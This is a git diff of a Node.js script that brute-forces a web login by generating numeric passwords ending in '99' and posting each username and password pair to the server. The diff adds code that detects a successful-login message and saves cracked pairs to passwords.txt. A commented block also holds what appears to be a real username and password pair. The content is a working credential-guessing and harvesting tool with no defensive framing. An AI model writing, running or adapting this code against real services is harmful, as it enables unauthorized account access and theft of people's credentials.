@@ -1,6 +1,8 @@
 const request = require('request');
 const parseString = require('xml2js').parseString;
 const msg = "You have successfully logged in";
+const fs = require('fs');
+
 
 function postRequest(usr, pwd, out) {
     request.post({
@@ -17,15 +19,24 @@ function postRequest(usr, pwd, out) {
 
             if (err) { console.log(err); }
             else if (body) {
-                parseString(body, function (err, result) {
+                parseString(res.body, function (err, result) {
 
                     if (err) { console.log(err); }
                     else if (result) {
-
-                        console.log("success");
-                        out.val = true;
-                        console.log(usr);
-                        console.log(pwd);
+                        if (result.requestresponse.message === msg) {
+                            out.val = true;
+                            console.log(usr);
+                            console.log(pwd);
+                            let obj = {
+                                username: usr,
+                                password: pwd
+                            };
+                            obj = JSON.stringify(obj);
+                            fs.appendFile('passwords.txt', obj + '\n', 'utf8', function (err) {
+                                if (err) throw err;
+                                console.log('Saved!');
+                            });
+                        }
 
                     }
                 })
@@ -62,10 +73,7 @@ function main() {
                     pwd = pwd + `${j}` + `${k}`;
                 }
                 pwd = pwd + "99";
-                console.log(usr);
-                console.log(pwd);
                 postRequest(usr, pwd, out);
-                console.log(out.val);
                 if (out.val == true) break;
 
             }
@@ -73,10 +81,17 @@ function main() {
 
         }
         if (out.val == true) break;
-
-
     }
 }
+
+// function main() {
+//     out = {
+//         val: false
+//     }
+//     pwd = "230499"
+//     usr = "imh1005218"
+//     postRequest(usr, pwd, out);
+// }
 
 
 
